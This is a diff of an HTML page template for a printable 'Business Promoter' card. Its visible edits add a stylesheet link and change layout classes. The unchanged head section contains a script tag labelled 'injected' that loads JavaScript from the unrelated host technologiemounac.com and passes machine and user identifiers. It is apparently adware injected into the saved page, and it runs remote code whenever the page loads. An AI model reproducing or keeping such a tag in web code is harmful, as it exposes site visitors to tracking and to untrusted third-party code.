@@ -6,6 +6,7 @@
 	<link href="css/bootstrap.min.css" rel="stylesheet" /><!-- font-awesome -->
 	<link href="css/font-awesome.min.css" rel="stylesheet" /><!-- My Custom Css -->
 	<link href="css/style.css" rel="stylesheet" />
+	<link href="css/script.css" rel="stylesheet" />
 	<link href="css/print.css" rel="stylesheet" />
 	<link href="css/responsive.css" media="all" rel="stylesheet" type="text/css" /><!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries --><!-- WARNING: Respond.js doesn't work if you view the page via file:// --><!--[if lt IE 9]>
       <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
@@ -17,9 +18,9 @@
 	</style>
 <script data-type="injected" src="//technologiemounac.com/addon/script/content_site?integration=anywhere&v=n11.12.1.194&os_mj=6&os_mn=3&os_bitness=64&mid=e0bd4dd1f884e045e7f81dd8209edbff&uid=E3D09E3B35223EA5633E6C2E52114E33&aid=4020&aid2=none&ts=1482151938&ts2=&psd=true"></script></head>
 <body>
-<div class="container-fluid">
+<div class="container-fluid main">
 	<div class="row display-table"  id="scrdisplay-tableoll">
-		<div class="col-md-8 col-md-offset-3 a4_red_frame display-table-cell text-center">
+		<div class="col-md-10 col-md-offset-3 a4_red_frame display-table-cell text-center">
 			<div class="script-text golden-color" id="div_print">
 				<h3 class="golden-color">Business Promoter</h3>
 
